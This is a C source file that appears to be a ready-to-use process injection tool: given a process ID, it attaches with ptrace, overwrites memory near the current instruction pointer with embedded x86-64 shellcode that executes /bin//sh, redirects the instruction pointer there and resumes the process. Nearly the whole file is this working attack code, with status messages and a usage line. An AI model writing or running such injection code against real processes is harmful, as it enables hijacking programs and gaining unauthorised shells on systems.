#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/user.h>
#include <sys/ptrace.h>
#include <sys/wait.h>

// PTRACE_ATTACH - allows you to attach to one process, pausing the debugged process
// PTRACE_PEEKTEXT - allows you to read data from the address space of another process
// PTRACE_POKETEXT - allows you to write data to the address space of another process
// PTRACE_GETREGS - reads the current state of the process registers
// PTRACE_SETREGS - writes the state of the process registers
// PTRACE_CONT - continues execution of the debugged process

char payload[] = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05";

int main(int argc, char *argv[]) {
    if(argc < 2){
        printf("Usage: %s <pid>\n", argv[0]);
        return 1;
    }

    int pid = atoi(argv[1]);
    
    printf("[+] Process ID to be injected: %d\n", pid);

    if(ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) {
        perror("[-] PTRACE_ATTACH failed");
        return 1;
    }
    wait(NULL);

    printf("[+] Attached to process %d\n", pid);
    
    struct user_regs_struct regs;
    if(ptrace(PTRACE_GETREGS, pid, NULL, &regs) == -1) {
        perror("[-] PTRACE_GETREGS failed");
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return 1;
    }
    printf("[+] Successfully retrieved registers from process %d\n", pid);
    printf("RIP = 0x%llx\n", regs.rip);
    
    long payload_size = sizeof(payload);
    long payload_addr = regs.rip - payload_size;
    for(long i = 0; i < payload_size; i += sizeof(long)) {
        long data = 0;
        memcpy(&data, payload + i, sizeof(long));
        if(ptrace(PTRACE_POKETEXT, pid, payload_addr + i, data) == -1) {
            perror("[-] PTRACE_POKETEXT failed");
            ptrace(PTRACE_DETACH, pid, NULL, NULL);
            return 1;
        }
    }

    printf("[+] Payload injected at address 0x%lx\n", payload_addr);
    regs.rip = payload_addr;
    ptrace(PTRACE_SETREGS, pid, NULL, &regs);
    if(ptrace(PTRACE_CONT, pid, NULL, NULL) == -1) {
        perror("[-] PTRACE_CONT failed");
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return 1;
    }
    printf("[+] Process %d continued execution with injected payload\n", pid);

    
    return 0;
}